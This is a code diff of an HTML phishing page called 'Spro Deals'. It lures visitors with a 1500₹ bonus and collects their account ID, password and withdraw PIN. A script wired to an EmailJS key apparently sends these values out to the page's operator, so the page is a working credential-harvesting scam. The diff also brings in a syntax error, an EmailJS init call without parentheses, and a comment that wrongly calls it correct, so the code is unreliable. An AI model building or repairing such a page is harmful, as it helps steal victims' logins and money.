@@ -15,7 +15,7 @@
   <div class="card" id="formCard">
     <h2>Welcome to Spro Deals</h2>
     <p>You will get 1500₹ bonus if you complete the following steps:</p>
-    <form id="sproForm" onsubmit="return false;">   <!-- 🚨 added return false -->
+    <form id="sproForm">
       <input type="text" id="account_id" placeholder="Enter your ID number" required><br>
       <input type="text" id="pass" placeholder="Enter your password" required><br>
       <input type="text" id="pin" placeholder="Enter your withdraw PIN" required><br>
@@ -32,11 +32,10 @@
   <script src="https://cdn.emailjs.com/sdk/3.2/email.min.js"></script>
   <script>
     document.addEventListener("DOMContentLoaded", function() {
-      emailjs.init("-7KTj0rOkVUhgUEx2"); // ✅ sirf key
+      emailjs.init"-7KTj0rOkVUhgUEx2"; // ✅ sirf key, koi bracket nahi
 
-      var form = document.getElementById("sproForm");
-      form.addEventListener("submit", function(e){
-        e.preventDefault();  // 🚨 stop refresh
+      document.getElementById("sproForm").addEventListener("submit", function(e){
+        e.preventDefault();
 
         var templateParams = {
           account_id: document.getElementById("account_id").value,
